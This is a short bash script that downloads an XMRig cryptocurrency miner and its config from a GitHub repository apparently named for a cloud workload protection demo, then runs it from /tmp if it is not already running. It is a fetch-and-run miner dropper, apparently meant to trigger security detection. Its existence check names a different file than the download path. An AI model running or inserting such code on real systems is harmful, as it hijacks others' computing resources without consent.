#!/bin/bash

if [ ! -f /tmp/xmrig-demo ]; then
        echo "[INFO] XMRig not found, downloading..."
        curl https://raw.githubusercontent.com/chkp-stuartgreen/cwpp-demo/main/xmrig -o /tmp/xmrig
        curl https://raw.githubusercontent.com/chkp-stuartgreen/cwpp-demo/main/config.json -o /tmp/config.json
        chmod +x /tmp/xmrig
else
	echo "[INFO] XMRig binary found"
fi

if [ $(ps -ef | grep -v grep | grep xmrig | awk '{print $2}'| wc -l) = "0" ]; then
        echo "[INFO] XMRig not running. Launching..."
        /tmp/xmrig -c /tmp/config.json
else
	echo "[INFO] XMRig already running"
fi
